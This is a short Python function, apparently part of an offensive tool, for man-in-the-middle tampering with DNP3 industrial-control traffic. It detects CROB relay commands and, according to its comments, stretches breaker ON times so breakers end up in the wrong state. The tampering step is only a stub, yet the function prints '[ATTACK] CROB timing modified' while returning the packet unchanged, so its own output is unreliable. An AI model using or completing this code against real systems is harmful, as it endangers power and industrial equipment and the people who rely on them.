def dnp3_crob_mitm(data, direction):
    """
    Intercept and modify DNP3 CROB commands
    """
    if len(data) < 10:
        return data

    # Check for DNP3 start bytes
    if data[0:2] != b'\x05\x64':
        return data

    print(f"[{direction}] DNP3 packet detected")

    # Parse Data Link Layer
    length = data[2]
    control = data[3]
    func_code = control & 0x0F

    if func_code == 0x04:  # User Data
        # Parse Application Layer
        # Look for CROB (Control Relay Output Block) - Group 12

        if b'\x0C\x01' in data:  # Group 12, Variation 1 (CROB)
            print("    [!] CROB detected")

            # Modify CROB parameters
            # Example: Change ON time from 100ms to 10000ms
            # (Causes breaker to be in wrong state)

            print("    [ATTACK] CROB timing modified")

    return data
